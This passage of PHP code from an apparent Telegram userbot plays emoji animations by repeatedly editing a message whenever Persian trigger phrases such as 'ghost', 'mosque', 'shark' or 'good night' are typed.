                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🔥            ‌     💵"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🔥            ‌    💵"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🔥            ‌   💵"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🔥            ‌  💵"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🔥            ‌ 💵"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🔥            ‌💵"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🔥           💵"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🔥          💵"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🔥         💵"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🔥        💵"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🔥       💵"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🔥      💵"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🔥     💵"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🔥    💵"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🔥   💵"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🔥  💵"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🔥 💵"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "💸"]);
                    }
                    if ($text == 'با کارای ت باید چالش سعی کن نرینی بزارن' or $text == 'خزوخیل') {
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "💩               🤢"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "💩              🤢"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "💩             🤢"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "💩            🤢"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "💩           🤢"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "💩          🤢"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "💩         🤢"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "💩        🤢"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "💩       🤢"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "💩      🤢"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "💩     🤢"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "💩    🤢"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "💩   🤢"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "💩  🤢"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "💩 🤢"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🤮🤮"]);
                    }
                    if ($text == 'جن' or $text == 'روح' or $text == 'روحح') {
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👻                                   🙀"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👻                                  🙀"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👻                                 🙀"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👻                                🙀"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👻                               🙀"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👻                              🙀"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👻                             🙀"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👻                            🙀"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👻                           🙀"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👻                          🙀"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👻                         🙀"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👻                        🙀"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👻                       🙀"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👻                      🙀"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👻                     🙀"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👻                    🙀"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👻                   🙀"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👻                  🙀"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👻                 🙀"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👻               🙀"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👻              🙀"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👻             🙀"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👻            🙀"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👻           🙀"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👻          🙀"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👻         🙀"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👻        🙀"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👻       🙀"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👻      🙀"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👻     🙀"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👻    🙀"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👻   🙀"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👻  🙀"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👻 🙀"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "👻😿"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "☠روح دید و سکته کرد☠"]);
                    }
                    if ($text == 'برم خونه' or $text == 'رسیدم خونه') {
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🏠              🚶‍♂"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🏠             🚶‍♂"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🏠            🚶‍♂"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🏠           🚶‍♂"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🏠          🚶‍♂"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🏠         🚶‍♂"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🏠        🚶‍♂"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🏠       🚶‍♂"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🏠      🚶‍♂"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🏠     🚶‍♂"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🏠    🚶‍♂"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🏠   🚶‍♂"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🏠  🚶‍♂"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🏠 🚶‍♂"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🏠🚶‍♂"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "رسیدیم و رسیدیم کاشکی نمیرسیدیم"]);
                    }
                    if ($text == 'کرج' or $text == 'karaj') {
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🖐-----------------🤚"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🖐----------------🤚"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🖐---------------🤚"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🖐--------------🤚"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🖐-------------🤚"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🖐------------🤚"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🖐-----------🤚"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🖐----------🤚"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🖐---------🤚"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🖐--------🤚"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🖐-------🤚"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🖐------🤚"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🖐-----🤚"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🖐----🤚"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🖐---🤚"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🖐--🤚"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🖐-🤚"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "کرج🤝"]);
                    }


                    if ($text == 'فرار از خونه' or $text == 'شکست عشقی') {
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🏡 💃"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🏡  💃"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🏡   💃"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🏡    💃"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🏡     💃"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🏡      💃"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🏡       💃"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🏡        💃"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🏡         💃"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🏡          💃"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🏡           💃"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🏡            💃"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🏡              💃💔👫"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🏡                 🚶‍♀"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🏡               🚶‍♀"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🏡             🚶‍♀"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🏡           🚶‍♀"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🏡         🚶‍♀"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🏡       🚶‍♀"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🏡     🚶‍♀"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🏡  🚶‍♀"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🏡🚶‍♀"]);
                    }
                    if ($text == 'عقاب' or $text == 'ایگل' or $text == 'پیشی برد') {
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🐍                         🦅"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🐍                       🦅"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🐍                     🦅"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🐍                   🦅"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🐍                 🦅"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🐍                🦅"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🐍              🦅"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🐍            🦅"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🐍           🦅"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🐍          🦅"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🐍         🦅"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🐍        🦅"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🐍       🦅"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🐍      🦅"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🐍     🦅"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🐍    🦅"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🐍   🦅"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🐍 🦅"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🐍🦅"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "پیشی برد😹"]);
                    }
                    if ($text == 'حموم' or $text == 'حمام' or $text == 'حمومم') {
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🛁🚪                  🗝🤏"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🛁🚪                 🗝🤏"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🛁🚪                🗝🤏"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🛁🚪              🗝🤏"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🛁🚪             🗝🤏"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🛁🚪            🗝🤏"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🛁🚪           🗝🤏"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🛁🚪          🗝🤏"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🛁🚪         🗝🤏"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🛁🚪        🗝🤏"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🛁🚪       🗝🤏"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🛁🚪      🗝🤏"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🛁🚪     🗝🤏"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🛁🚪    🗝🤏"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🛁🚪   🗝🤏"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🛁🚪  🗝🤏"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🛁🚪 🗝🤏"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🛁🚪🗝🤏"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🛀💦😈"]);
                    }
                    if ($text == 'آپدیت' or $text == 'اپدیت' or $text == 'آپدیت شو') {
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "▪️10%"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "▪️▪️20%"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "▪️▪️▪️30%"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "▪️▪️▪️▪️40%"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "▪️▪️▪️▪️▪️50%"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "▪️▪️▪️▪️▪️▪️60%"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "▪️▪️▪️▪️▪️▪️▪️70%"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "▪️▪️▪️▪️▪️▪️▪️▪️80%"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "▪️▪️▪️▪️▪️▪️▪️▪️▪️90%"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "❗️EROR❗️"]);
                    }
                    if ($text == 'جنایتکارو بکش' or $text == 'بکشش' or $text == 'خایمالو بکش') {
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "😂                 • 🔫🤠"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "😂                •  🔫🤠"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "😂               •   🔫🤠"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "😂              •    🔫🤠"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "😂             •     🔫🤠"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "😂            •      🔫🤠"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "😂           •       🔫🤠"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "😂          •        🔫🤠"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "😂         •         🔫🤠"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "😂        •          🔫🤠"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "😂       •           🔫🤠"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "😂      •            🔫🤠"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "😂     •             🔫🤠"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "😂    •              🔫🤠"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "😂   •               🔫🤠"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "😂  •                🔫🤠"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "😂 •                 🔫🤠"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "😂•                  🔫🤠"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🤯                  🔫 🤠"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "فرد جنایتکار کشته شد :)"]);
                    }
                    if ($text == 'بریم مسجد' or $text == 'مسجد') {
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🕌                  🚶‍♂"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🕌                 🚶‍♂"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🕌                🚶‍♂"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🕌               🚶‍♂"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🕌              🚶‍♂"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🕌             🚶‍♂"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🕌            🚶‍♂"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🕌           🚶‍♂"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🕌          🚶‍♂"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🕌         🚶‍♂"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🕌        🚶‍♂"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🕌       🚶‍♂"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🕌      🚶‍♂"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🕌     🚶‍♂"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🕌    🚶‍♂"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🕌   🚶‍♂"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🕌  🚶‍♂"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🕌 🚶‍♂"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🕌🚶‍♂"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "اشهدان الا الا الله📢"]);
                    }
                    if ($text == 'کوسه' or $text == 'وای کوسه') {
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🏝┄┅┄┅┄┄┅🏊‍♂┅┄┄┅🦈"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🏝┄┅┄┅┄┄🏊‍♂┅┄┄🦈"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🏝┄┅┄┅┄🏊‍♂┅┄🦈"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🏝┄┅┄┅🏊‍♂┅┄🦈"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🏝┄┅┄🏊‍♂┅┄🦈"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🏝┄┅🏊‍♂┅┄🦈"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🏝┄🏊‍♂┅┄🦈"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🏝🏊‍♂┅┄🦈"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "اوخیش شانس آوردما :)"]);
                    }
                    if ($text == 'بارون') {
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "☁️                ⚡️"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "☁️               ⚡️"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "☁️              ⚡️"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "☁️             ⚡️"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "☁️            ⚡️"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "☁️           ⚡️"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "☁️          ⚡️"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "☁️         ⚡️"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "☁️        ⚡️"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "☁️       ⚡️"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "☁️      ⚡️"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "☁️     ⚡️"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "☁️    ⚡️"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "☁️   ⚡️"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "☁️  ⚡️"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "☁️ ⚡️"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "⛈"]);
                    }
                    if ($text == 'بادکنک') {
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🔪                🎈"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🔪               🎈"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🔪              🎈"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🔪             🎈"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🔪            🎈"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🔪           🎈"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🔪          🎈"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🔪         🎈"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🔪        🎈"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🔪       🎈"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🔪      🎈"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🔪     🎈"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🔪    🎈"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🔪   🎈"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🔪  🎈"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🔪 🎈"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🔪🎈"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "💥Boom💥"]);
                    }
                    if ($text == 'شب خوش' or $text == 'شب بخیر ' or $text == 'شو خوش ') {
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🌜              🙃"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🌜             🙃"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🌜            🙃"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🌜           🙃"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🌜          🙃"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "🌜         🙃"]);
